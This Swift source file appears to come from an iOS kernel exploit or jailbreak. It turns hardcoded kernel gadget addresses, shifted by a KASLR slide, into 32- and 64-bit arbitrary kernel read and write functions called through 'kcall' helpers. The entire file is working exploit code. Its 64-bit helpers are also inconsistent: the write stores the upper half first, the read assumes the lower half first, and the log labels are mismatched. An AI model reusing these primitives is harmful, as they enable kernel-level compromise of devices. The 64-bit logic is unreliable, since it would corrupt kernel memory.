
import Foundation

/*
 0xFFFFFFF005BDFAF0
 for kr32
 LDR             X0, [X0,#0x90]
 RET
 */

let kckr32_gadget: UInt64 = 0xFFFFFFF005BDFAF0
let kckw32_gadget: UInt64 = 0xFFFFFFF00733CF2C

/*
 for kw32
 0xFFFFFFF00733CF2C
 STR             W1, [X0,#0x80]
 RET
 */

/*
 for rk32, no krw
 0xfffffff006c9b63c
 ldr w0, [x2, x1]
 ret
 
 */

/*
 for wk32, no krw
 0xfffffff0068f0ccc
 str w1, [x2]
 ret
 */


let rk32_static_gadget: UInt64 = 0xfffffff006c9b63c
@_cdecl("kckw32")
func kckw32(virt: UInt64, what: UInt32) {
    NSLog("ABOUT TO KCKW32!!")
    kcall(kckw32_gadget + kernel_slide, virt - 0x80, UInt64(what), 0, 0, 0, 0, 0)
}

func split(_ value: UInt64) -> (UInt32, UInt32) {
    let lowerBits = UInt32(value & 0xFFFFFFFF)
    let upperBits = UInt32((value >> 32) & 0xFFFFFFFF)
    return (upperBits, lowerBits)
}

func combine(upper: UInt32, lower: UInt32) -> UInt64 {
    let combinedValue: UInt64 = (UInt64(upper) << 32) | UInt64(lower)
    return combinedValue
}

@_cdecl("kckw64")
func kckw64(virt: UInt64, what: UInt64) {
    NSLog("ABOUT TO KCKW32!!")
        
    let (upper, lower) = split(what)
    
    kcall(kckw32_gadget + kernel_slide, virt - 0x80, UInt64(upper), 0, 0, 0, 0, 0)
    kcall(kckw32_gadget + kernel_slide, virt - 0x80 + 0x4, UInt64(lower), 0, 0, 0, 0, 0)
}

@_cdecl("kckr32")
func kckr32(virt: UInt64) -> UInt32 {
    NSLog("ABOUT TO KCRK32!!")
    return UInt32(truncatingIfNeeded: kcallread_raw(
        rk32_static_gadget + kernel_slide,
        0, // x0
        0, // x1: ldr imm
        virt, // x2: ldr address
        0, 0, 0, 0
    ))
}

@_cdecl("kckr64")
func kckr64(virt: UInt64) -> UInt64 {
    NSLog("ABOUT TO KCRK32!!")
    let lower = kckr32(virt: virt)
    let upper = kckr32(virt: virt + 0x4)
        
    return combine(upper: UInt32(truncatingIfNeeded: upper), lower: UInt32(truncatingIfNeeded: lower))
}
